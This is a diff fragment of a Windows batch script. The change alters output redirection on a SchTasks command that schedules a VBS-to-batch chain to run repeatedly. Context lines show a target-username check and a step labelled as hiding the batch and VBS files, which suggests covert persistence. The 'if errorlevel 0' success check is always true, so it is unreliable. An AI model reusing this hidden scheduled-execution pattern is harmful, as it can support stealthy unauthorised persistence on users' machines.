@@ -353,7 +353,7 @@ IF "%USERNAME%"=="%targetusername%" (
 :skipupdateconfig
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
-2>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
+>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
 if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")
 
 :: Hide batch & VBS
